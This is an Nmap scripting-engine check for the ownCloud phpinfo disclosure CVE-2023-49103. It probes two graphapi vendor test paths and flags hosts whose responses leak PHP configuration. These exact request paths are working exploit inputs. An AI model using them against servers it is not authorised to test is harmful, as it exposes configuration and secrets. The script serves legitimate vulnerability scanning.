local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"

description = [[
This NSE script checks for ownCloud - Phpinfo Configuration Vulnerability (CVE-2023-49103).
]]
---
-- @usage
-- nmap --script http-vuln-cve2023-49103 -p <port> <host>
-- nmap --script http-vuln-cve2023-49103 -p <port> <host> --script-args http.host=<host>
--
-- @output
-- PORT   STATE SERVICE
-- 443/tcp open  http
-- | http-vuln-cve2023-49103: 
-- |   Host is vulnerable to CVE-2023-49103
--

author = "Dhiraj Mishra (@RandomDhiraj)"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln"}

portrule = shortport.portnumber(443)

action = function(host, port)
  local vuln = {
    title = 'ownCloud - Phpinfo Configuration Vulnerability (CVE-2023-49103)',
    state = vulns.STATE.NOT_VULN,
    description = [[
      An issue was discovered in ownCloud where the graphapi app exposes sensitive information through a Phpinfo configuration file.
    ]],
    references = {
      'https://nvd.nist.gov/vuln/detail/CVE-2023-49103',
    },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local paths = {
    "/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/input.css",
    "/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/zero.css"
  }
  local response
  local vulnerable = false

  for _, path in ipairs(paths) do
    response = http.get(host, port, path)
    if response.status == 200 and 
       string.find(response.body, "PHP Extension") and
       string.find(response.body, "PHP Version") and
       string.find(response.body, "owncloud") then
      stdnse.print_debug("%s: %s GET %s - 200 OK", SCRIPT_NAME, host.targetname or host.ip, path)
      vuln.state = vulns.STATE.VULN
      vulnerable = true
      break
    end
  end

  if not vulnerable then
    stdnse.print_debug("%s: The host does not appear to be vulnerable.", SCRIPT_NAME)
  end

  return vuln_report:make_output(vuln)
end
